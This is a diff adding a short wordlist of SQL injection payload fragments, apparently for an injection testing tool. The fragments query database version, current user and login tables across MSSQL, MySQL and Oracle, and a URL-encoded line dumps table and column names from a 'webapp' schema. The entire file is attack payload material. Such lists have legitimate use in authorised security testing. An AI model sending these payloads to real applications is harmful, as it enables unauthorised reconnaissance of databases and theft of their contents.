@@ -1,0 +1,7 @@
+@@version
+user
+name+from+master..syslogins
+user()
+user+from+dual
+banner+from+v$version
+table_name%2b%27:%27%2bcolumn_name%2b%27:%27%2bdata_type+from+webapp.information_schema.columns--
